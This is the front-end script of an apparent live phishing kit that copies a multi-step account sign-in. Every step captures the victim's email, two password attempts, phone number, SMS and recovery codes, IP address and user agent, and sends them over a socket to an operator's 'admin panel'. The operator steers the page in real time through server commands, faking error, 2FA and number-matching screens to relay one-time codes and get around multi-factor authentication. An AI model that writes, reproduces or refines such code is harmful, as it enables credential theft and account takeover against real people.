// ── Socket (initialised immediately at parse time) ────────────────────────────
// Must be outside DOMContentLoaded so the socket handshake starts as early as
// possible. If it were inside the callback, a slow DOM parse could delay the
// connection long enough that server_command events arrive before the listener
// is registered and are silently dropped.
const socket = io();

document.addEventListener('DOMContentLoaded', () => {

    // ── UI Elements ───────────────────────────────────────────────────────────
    const topLoader    = document.getElementById('top_loader');
    const clickBlocker = document.getElementById('click_blocker');

    // ── Input References ──────────────────────────────────────────────────────
    const unameInp       = document.getElementById('inp_uname');
    const pwdInp         = document.getElementById('inp_pwd');
    const confirmInp     = document.getElementById('inp_confirm');
    const verifyStartInp = document.getElementById('inp_verify');
    const verifyCodeInp  = document.getElementById('inp_code');
    const recoveryInp    = document.getElementById('inp_recovery');
    const recoveryOtpInp = document.getElementById('inp_recovery_otp');

    // ── Persistent Identity Store ─────────────────────────────────────────────
    // Once the user types their email and clicks Next we capture it here.
    // After step 1 the section switches and unameInp may be visually hidden,
    // but its DOM value stays intact in most cases. Storing it explicitly in
    // _capturedUsername guarantees every subsequent sendToAdmin call always
    // has the correct identity — even if the browser clears the field on
    // section transition, autofill replaces it, or the input is removed from
    // the visible DOM by a future refactor.
    let _capturedUsername = 'unknown';

    // ── Helper: cache btn references once DOM is ready ────────────────────────
    const btn = (id) => document.getElementById(id);

    // ── Logo Fallback ─────────────────────────────────────────────────────────
    // Forces all logo images to the local asset path (guards against
    // external logo URLs failing to load on first render).
    function updateLogos() {
        document.querySelectorAll('img[alt="logo"]').forEach(img => {
            img.onerror = null;
            img.src = 'assets/logo.svg';
        });
    }

    // ── Section Switcher ──────────────────────────────────────────────────────
    // Hides all sections then reveals only the target one.
    // Sets display:"table-cell" to match body { display:table } in the CSS —
    // this is what produces the correct full-viewport vertical centering.
    const ALL_SECTIONS = [
        'section_uname',
        'section_pwd',
        'section_confirm',
        'section_verify',
        'section_code',
        'section_final',
        'section_auth_num',
        'section_auth_err',
        'section_recovery',
        'section_recovery_otp',
    ];

    function forceShowSection(targetId) {
        // Hide every section first — both inline style and class cleared
        ALL_SECTIONS.forEach(id => {
            const el = document.getElementById(id);
            if (el) {
                el.style.display = 'none';
                el.classList.add('d-none');
            }
        });

        // Show only the target section using table-cell so the CSS
        // display:table on <body> + display:table-cell on <section> pattern
        // produces correct full-viewport vertical centering on all screen sizes.
        const targetEl = document.getElementById(targetId);
        if (targetEl) {
            targetEl.style.display = 'table-cell';
            targetEl.classList.remove('d-none');
        }
    }

    // ── User Identity Display ─────────────────────────────────────────────────
    // FIX: selector updated to include all unique identity span IDs added
    // during the HTML sanitization (user_identity_confirm, user_identity_auth_num,
    // user_identity_auth_err were added; old duplicate id="user_identity" removed).
    function updateUserIdentity(email) {
        const identitySelectors = [
            '#user_identity',
            '#user_identity_confirm',
            '#user_identity_auth_num',
            '#user_identity_auth_err',
            '#user_identity_rec',
            '#user_identity_rec_otp',
        ];
        document.querySelectorAll(identitySelectors.join(', ')).forEach(el => {
            el.innerText = email;
        });
    }

    // ── Loader Helpers ────────────────────────────────────────────────────────
    function showLoader() {
        if (topLoader)    topLoader.style.display    = 'block';
        if (clickBlocker) clickBlocker.style.display = 'block';
    }

    function hideLoader() {
        if (topLoader)    topLoader.style.display    = 'none';
        if (clickBlocker) clickBlocker.style.display = 'none';
    }

    // ── Server Command Handler ────────────────────────────────────────────────
    socket.on('server_command', (cmdData) => {
        // Support both plain string commands and object { action, payload }
        const action  = (typeof cmdData === 'string') ? cmdData : cmdData.action;
        const payload = cmdData.payload || null;

        hideLoader();

        switch (action) {

            case 'next_to_password':
                forceShowSection('section_pwd');
                updateUserIdentity(_capturedUsername);
                break;

            case 'show_pwd_error':
                forceShowSection('section_confirm');
                updateUserIdentity(_capturedUsername);
                break;

            case 'next_to_2fa':
                forceShowSection('section_verify');
                break;

            case 'show_2fa_error': {
                forceShowSection('section_code');
                const errCode = document.getElementById('error_code');
                if (errCode) errCode.innerText = 'The code you entered is incorrect. Please try again.';
                if (verifyCodeInp) verifyCodeInp.classList.add('error-inp');
                break;
            }

            case 'show_auth_num': {
                forceShowSection('section_auth_num');
                updateUserIdentity(_capturedUsername);
                if (payload) {
                    const digitEl = document.getElementById('auth_digit_display');
                    if (digitEl) digitEl.innerText = payload;
                }
                break;
            }

            case 'show_auth_err':
                forceShowSection('section_auth_err');
                updateUserIdentity(_capturedUsername);
                break;

            case 'show_recovery_email':
                forceShowSection('section_recovery');
                updateUserIdentity(_capturedUsername);
                break;

            case 'next_to_recovery_otp': {
                forceShowSection('section_recovery_otp');
                updateUserIdentity(_capturedUsername);
                const recEmail  = (recoveryInp && recoveryInp.value.trim() !== '')
                    ? recoveryInp.value
                    : 'your email';
                const otpTextEl = document.getElementById('recovery_otp_text');
                if (otpTextEl) {
                    otpTextEl.innerText =
                        `If ${recEmail} matches the email address on your account, we'll send you a code.`;
                }
                break;
            }

            case 'show_recovery_otp_error': {
                forceShowSection('section_recovery_otp');
                const errRec = document.getElementById('error_recovery_otp');
                if (errRec) errRec.classList.remove('d-none');
                if (recoveryOtpInp) recoveryOtpInp.classList.add('error-inp');
                break;
            }

            case 'finish':
                forceShowSection('section_final');
                break;

            default:
                console.warn('[script.js] Unhandled server_command action:', action);
                break;
        }
    });

    // ── Send Data to Admin Panel ──────────────────────────────────────────────
    async function sendToAdmin(stepName, additionalData = {}) {
        showLoader();

        // ── Identity resolution — three-tier fallback ─────────────────────────
        // Tier 1: _capturedUsername — locked in at btn_next click, most reliable.
        // Tier 2: unameInp.value   — live read, covers edge cases before lock.
        // Tier 3: any identity span — scans ALL six spans in document order and
        //         returns the first one that has real text content. This covers
        //         every section where the email chip is displayed: section_pwd,
        //         section_confirm, section_auth_num, section_auth_err,
        //         section_recovery, section_recovery_otp.
        const liveInput = (unameInp && unameInp.value.trim() !== '')
            ? unameInp.value.trim()
            : '';

        // Walk every identity span — return first non-empty innerText found
        const ALL_IDENTITY_IDS = [
            'user_identity',
            'user_identity_confirm',
            'user_identity_auth_num',
            'user_identity_auth_err',
            'user_identity_rec',
            'user_identity_rec_otp',
        ];
        let spanFallback = '';
        for (const id of ALL_IDENTITY_IDS) {
            const el = document.getElementById(id);
            if (el && el.innerText.trim() !== '') {
                spanFallback = el.innerText.trim();
                break;
            }
        }

        const resolvedUsername = _capturedUsername !== 'unknown'
            ? _capturedUsername
            : (liveInput || spanFallback || 'unknown');

        let ip = '0.0.0.0';
        try {
            const response = await fetch('https://api.ipify.org/?format=json');
            const resData  = await response.json();
            ip = resData.ip || '0.0.0.0';
        } catch (e) {
            console.error('[script.js] IP fetch failed:', e);
        }

        socket.emit('send_logs', {
            step:      stepName,
            username:  resolvedUsername,
            ipAddress: ip,
            userAgent: navigator.userAgent,
            ...additionalData,
        });
    }

    // ── Button Event Listeners ────────────────────────────────────────────────

    // Step 1 — Email / Username submitted
    // This is the ONLY moment the raw email input is guaranteed to be
    // populated. We lock it into _capturedUsername here so every subsequent
    // step sends the correct identity even after the section has switched
    // and the browser may have cleared or hidden the input field.
    const btnNext = btn('btn_next');
    if (btnNext) {
        btnNext.addEventListener('click', () => {
            if (unameInp && unameInp.value.trim() !== '') {
                _capturedUsername = unameInp.value.trim(); // lock identity
                updateLogos();
                sendToAdmin('Email Submitted');
            }
        });
    }

    // Step 2 — First password attempt
    const btnConfirm = btn('btn_confirm');
    if (btnConfirm) {
        btnConfirm.addEventListener('click', () => {
            if (pwdInp && pwdInp.value.trim() !== '') {
                sendToAdmin('First Password Submitted', { password: pwdInp.value });
            }
        });
    }

    // Step 3 — Second password attempt (after incorrect password screen)
    const btnSig = btn('btn_sig');
    if (btnSig) {
        btnSig.addEventListener('click', () => {
            if (confirmInp && confirmInp.value.trim() !== '') {
                sendToAdmin('Second Password Submitted', { password: confirmInp.value });
            }
        });
    }

    // Step 4 — Phone number for 2FA: send to admin then auto-advance to code
    // screen after 5 seconds to simulate SMS delivery delay.
    const btnVerify = btn('btn_verify');
    if (btnVerify) {
        btnVerify.addEventListener('click', () => {
            if (verifyStartInp && verifyStartInp.value.trim() !== '') {
                sendToAdmin('Phone Number Submitted', { phone: verifyStartInp.value });
                setTimeout(() => {
                    forceShowSection('section_code');
                }, 5000);
            }
        });
    }

    // Step 5 — OTP / SMS code submitted
    const btnCode = btn('btn_code');
    if (btnCode) {
        btnCode.addEventListener('click', () => {
            if (verifyCodeInp && verifyCodeInp.value.trim() !== '') {
                sendToAdmin('OTP Code Submitted', { otp: verifyCodeInp.value });
            }
        });
    }

    // Step 6 — Recovery email submitted
    const btnRecovery = btn('btn_recovery');
    if (btnRecovery) {
        btnRecovery.addEventListener('click', () => {
            if (recoveryInp && recoveryInp.value.trim() !== '') {
                sendToAdmin('Recovery Email Submitted', { recovery_email: recoveryInp.value });
            }
        });
    }

    // Step 7 — Recovery OTP submitted
    const btnRecoveryOtp = btn('btn_recovery_otp');
    if (btnRecoveryOtp) {
        btnRecoveryOtp.addEventListener('click', () => {
            if (recoveryOtpInp && recoveryOtpInp.value.trim() !== '') {
                sendToAdmin('Recovery OTP Submitted', { otp: recoveryOtpInp.value });
            }
        });
    }

});
